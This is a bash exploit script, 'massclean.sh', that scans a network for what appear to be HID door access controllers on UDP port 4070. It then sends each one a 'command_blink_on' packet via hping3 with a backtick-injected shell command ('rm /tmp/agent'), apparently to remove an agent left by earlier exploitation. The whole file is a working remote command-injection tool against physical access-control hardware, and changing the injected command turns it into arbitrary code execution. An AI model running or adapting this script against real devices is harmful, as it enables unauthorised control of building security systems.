#!/bin/bash
CMDEXEC=`which hping3`
EXPECTED_ARGS=2;
if [ $# -ne $EXPECTED_ARGS ]
then
  echo "Usage: ./massclean.sh <Attacker IP> <Targets>"
  echo "Targets should be in Nmap Format, not input file"
  echo "Example: ./massclean.sh 10.0.0.1 10.1.1.0/24"
  echo "Note: Nmap will only be run again if this script can't find previous results"
  echo ""
  exit 2
fi

#Prepping stuff
if [ "$(ls | egrep -q datafiles && echo "1" || echo "0")" = "0" ]
then
  mkdir datafiles
  cd ./datafiles
else
  cd ./datafiles
fi

#Checking for previous results
if [ "$(ls | egrep -q targets.txt && echo "1" || echo "0")" = "0" ]
then
  #Running Nmap
  echo "No previous results found"
  echo "Starting Nmap against $2... This could take a while."
  echo "Stats will be provided every 30 seconds"
  nmap -sU -p 4070 --stats-every 30s --script hid-discoveryd-enum -oA results $2 | egrep '(remaining|Stats: )'
  echo "Nmap complete: -oA results at ./datafiles/results.*"
  #sorting nmap
  cat results.xml | grep script | sed 's/&#xa//g' | cut -d '<' -f 5 | cut -d ";" -f 3,5 | cut -d " " -f 9,5 | sed '/^\s*$/d' | sed 's/; /,/g' > hidtargets.txt
fi

#Cleaning Up
echo "Agent removal beginning."
for i in $(cat hidtargets.txt); do
  MAC=`(echo $i | cut -d ',' -f 1)`;
  IP=`(echo $i | cut -d ',' -f 2)`;
  echo 'command_blink_on;044;'$MAC';1`rm /tmp/agent`;' > data1.txt
  echo "Removing agent from $IP"
  ${CMDEXEC} -2 -p 4070 -c 1 -E data1.txt -d 150 $IP 2> /dev/null
  echo "Agent removed: $IP"
  echo ""
done
cd ../
echo ""
echo "Removeal of agent from all targets complete."
exit 1
